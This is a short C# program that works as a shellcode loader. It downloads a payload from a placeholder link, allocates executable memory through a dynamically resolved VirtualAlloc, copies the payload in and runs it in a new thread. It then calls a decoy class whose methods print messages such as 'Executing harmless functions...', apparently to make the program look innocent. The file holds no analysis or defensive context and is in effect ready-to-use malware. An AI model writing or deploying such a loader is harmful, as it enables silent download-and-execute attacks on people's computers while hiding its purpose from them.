using System;
using System.Net;
using System.Runtime.InteropServices;

class Program
{
    static void Main(string[] args)
    {
        string downloadLink = "[DOWNLOAD_LINK]";

        WebClient wc = new WebClient();
        byte[] payload = wc.DownloadData(downloadLink);

        IntPtr addr = GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAlloc");
        VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(VirtualAllocDelegate));
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);

        Marshal.Copy(payload, 0, mem, payload.Length);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);

        ExecuteOps();
    }

    static void ExecuteOps()
    {
        BenignopClass.Op1();
        BenignopClass.Op2();
        BenignopClass.Op3();
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}

class BenignopClass
{
    public static void Op1()
    {
        Console.WriteLine("Initializing benign operations...");
    }

    public static void Op2()
    {
        Console.WriteLine("Executing harmless functions...");
    }

    public static void Op3()
    {
        Console.WriteLine("Completing routine tasks...");
    }
}
